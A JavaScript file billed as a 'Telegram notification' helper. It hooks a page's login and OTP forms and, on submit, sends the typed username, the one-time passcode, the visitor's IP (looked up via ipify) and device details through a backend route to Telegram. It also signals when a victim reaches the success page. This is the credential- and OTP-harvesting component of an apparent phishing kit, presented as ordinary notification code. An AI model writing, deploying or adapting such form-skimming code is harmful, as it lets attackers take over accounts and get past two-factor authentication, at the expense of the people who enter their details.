// Telegram Integration - Client Side

class TelegramNotifier {
    constructor() {
        this.enabled = true;
        this.initialized = false;
        this.queue = [];
    }

    async initialize() {
        if (this.initialized) return;
        
        try {
            // Check if telegram is available
            const response = await fetch('/api/telegram/status');
            const data = await response.json();
            this.enabled = data.enabled;
            this.initialized = true;
            
            // Process queued messages
            if (this.enabled && this.queue.length > 0) {
                this.queue.forEach(msg => this.sendMessage(msg));
                this.queue = [];
            }
        } catch (error) {
            console.error('Telegram initialization error:', error);
            this.enabled = false;
        }
    }

    async sendMessage(message, type = 'info') {
        if (!this.initialized) {
            this.queue.push({ message, type });
            await this.initialize();
            return;
        }

        if (!this.enabled) {
            console.log('Telegram notifications disabled');
            return;
        }

        try {
            const response = await fetch('/api/telegram/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    message,
                    type,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    url: window.location.href
                })
            });

            const data = await response.json();
            if (!data.success) {
                console.error('Failed to send telegram message:', data.error);
            }
            return data;
        } catch (error) {
            console.error('Telegram send error:', error);
        }
    }

    // Specific notification methods
    async notifyLogin(username) {
        return this.sendMessage(
            `🔐 Login attempt for user: ${username}\n` +
            `🌐 IP: ${await this.getIP()}\n` +
            `🖥️ Device: ${navigator.userAgent}`,
            'login'
        );
    }

    async notifyOTP(otp) {
        return this.sendMessage(
            `🔢 OTP entered: ${otp}\n` +
            `🌐 IP: ${await this.getIP()}\n` +
            `🖥️ Device: ${navigator.userAgent}`,
            'otp'
        );
    }

    async notifySuccess() {
        return this.sendMessage(
            `✅ Verification completed successfully!\n` +
            `🌐 IP: ${await this.getIP()}\n` +
            `🖥️ Device: ${navigator.userAgent}`,
            'success'
        );
    }

    async getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unknown';
        }
    }
}

// Initialize Telegram notifier
const telegram = new TelegramNotifier();
telegram.initialize();

// Event listeners for telegram notifications
document.addEventListener('DOMContentLoaded', function() {
    // Login form submit
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', function(e) {
            const username = document.getElementById('username').value.trim();
            if (username) {
                telegram.notifyLogin(username);
            }
        });
    }

    // OTP form submit
    const otpForm = document.getElementById('otpForm');
    if (otpForm) {
        otpForm.addEventListener('submit', function(e) {
            const otp = document.getElementById('otp').value.trim();
            if (otp) {
                telegram.notifyOTP(otp);
            }
        });
    }

    // Success page
    if (window.location.pathname.includes('success.html')) {
        telegram.notifySuccess();
    }
});

// Export for use in other files
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { TelegramNotifier };
      }
